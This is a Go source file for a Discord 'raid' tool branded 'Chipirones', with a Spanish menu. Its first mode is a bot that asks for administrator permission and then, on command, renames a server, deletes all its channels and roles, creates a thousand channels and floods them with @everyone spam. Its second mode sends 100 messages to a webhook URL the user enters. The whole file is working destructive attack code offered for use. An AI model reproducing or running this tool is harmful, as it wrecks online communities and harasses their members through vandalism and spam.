package main

import (
	"bytes"
	"fmt"
	"github.com/atotto/clipboard"
	"github.com/bwmarrin/discordgo"
	"github.com/fatih/color"
	"github.com/inancgumus/screen"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
)

var (
	option  int8
	token   string
	webhook string
	prefix  = "-"
)

func main() {
	color.Yellow("\t--------------------------------")
	color.Red("\t██████╗██╗  ██╗██╗██████╗ ██╗██████╗  ██████╗ ███╗   ██╗███████╗███████╗")
	color.Red("\t██╔════╝██║  ██║██║██╔══██╗██║██╔══██╗██╔═══██╗████╗  ██║██╔════╝██╔════╝")
	color.Yellow("\t██║     ███████║██║██████╔╝██║██████╔╝██║   ██║██╔██╗ ██║█████╗  ███████╗")
	color.Yellow("\t██║     ██╔══██║██║██╔═══╝ ██║██╔══██╗██║   ██║██║╚██╗██║██╔══╝  ╚════██║")
	color.Red("\t╚██████╗██║  ██║██║██║     ██║██║  ██║╚██████╔╝██║ ╚████║███████╗███████║")
	color.Red("\t╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝")
	color.Yellow("\t--------------------------------")
	color.White("\n")
	color.HiRed("Elige una opción:")
	color.Red("[1] - RAID BOT")
	color.Red("[2] - Webhook Spammer")
	_, _ = fmt.Scanln(&option)
	screen.Clear()
	checkOption(option)
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc
}

func checkOption(option int8) {
	switch option {
	case 1:
		raidBot()
		break
	case 2:
		webhookSpammer()
		break
	}
}

func raidBot() {
	color.Yellow("--------------------------------")
	color.Red("Raid Bot b1")
	color.Red("Prefijo: " + color.HiGreenString(prefix))
	color.Yellow("--------------------------------")
	color.Red("Introduce el token:")
	_, _ = fmt.Scanln(&token)
	screen.Clear()
	ds, err := discordgo.New("Bot " + token)

	if err != nil {
		sendError(err)
		return
	}
	err = ds.Open()
	if err != nil {
		sendError(err)
		return
	}

	u, err := ds.User("@me")

	if err != nil {
		sendError(err)
		return
	}
	_ = clipboard.WriteAll("https://discord.com/api/oauth2/authorize?client_id=" + u.ID + "&permissions=8&scope=bot")
	color.Yellow("----------------------------------------------------------------")
	color.HiRed("Prefijo: " + color.HiGreenString(prefix))
	color.Yellow("----------------------------------------------------------------")
	color.HiRed("Comandos:")
	color.Red("\t" + prefix + "nuke")
	color.Red("\t" + prefix + "roles")
	color.Yellow("----------------------------------------------------------------")
	color.HiRed("Copiado enlace de invitación de " + color.HiGreenString(u.Username+"#"+u.Discriminator))
	color.Yellow("----------------------------------------------------------------")

	ds.AddHandler(cmdHandler)

}
func webhookSpammer() {
	color.Yellow("--------------------------------")
	color.Red("WebHook v6.66")
	color.Yellow("--------------------------------")
	color.Red("Introduce la dirección URL del Webhook:")
	_, _ = fmt.Scanln(&webhook)
	screen.Clear()
	for x := 0; x < 100; x++ {
		spamWebhook()
	}
}

func spamWebhook() {
	cont := []byte(`{"content":"https://discord.gg/hcAKam2T88 Fucked by Chipirones"}`)
	req, _ := http.NewRequest("POST", webhook, bytes.NewBuffer(cont))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	_, err := client.Do(req)
	if err != nil {
		sendError(err)
	}
	color.Red("Enviado mensaje a webhook")

}

func cmdHandler(s *discordgo.Session, m *discordgo.MessageCreate) {

	if strings.Contains(m.Content, "-nuke") {
		channels, err := s.GuildChannels(m.GuildID)

		if err != nil {
			sendError(err)
		}

		_, _ = s.GuildEdit(m.GuildID, discordgo.GuildParams{Name: "FvckedByChipirones"})

		for x := range channels {
			go channelDelete(s, channels[x].ID)
		}
		for x := 0; x < 1000; x++ {
			go channelCreateSpam(s, m.GuildID)
		}
	}

	if strings.Contains(m.Content, "-roles") {
		roles, err := s.GuildRoles(m.GuildID)
		if err != nil {
			sendError(err)
		}

		for x := range roles {
			go deleteRoles(s, m.GuildID, roles[x].ID)
		}
	}
}

func channelDelete(s *discordgo.Session, chID string) {
	_, err := s.ChannelDelete(chID)
	if err != nil {
		sendError(err)
	}
}

func channelCreateSpam(s *discordgo.Session, gID string) {
	ch, err := s.GuildChannelCreate(gID, "raided-by-chipirones", 0)

	if err != nil {
		sendError(err)
	}

	for x := 0; x < 15; x++ {
		go channelMsgSend(s, ch.ID)
	}
}

func channelMsgSend(s *discordgo.Session, chID string) {
	_, err := s.ChannelMessageSend(chID, "@everyone Raided by chipirones @ https://chipiron.es")

	if err != nil {
		sendError(err)
	}
}

func deleteRoles(s *discordgo.Session, gID string, rID string) {
	err := s.GuildRoleDelete(gID, rID)

	if err != nil {
		sendError(err)
	}
}

func sendError(error error) {
	color.Yellow("----------------------------------------------------------------")
	color.HiRed("ERROR")
	color.Red(error.Error())
	color.Yellow("----------------------------------------------------------------")
}
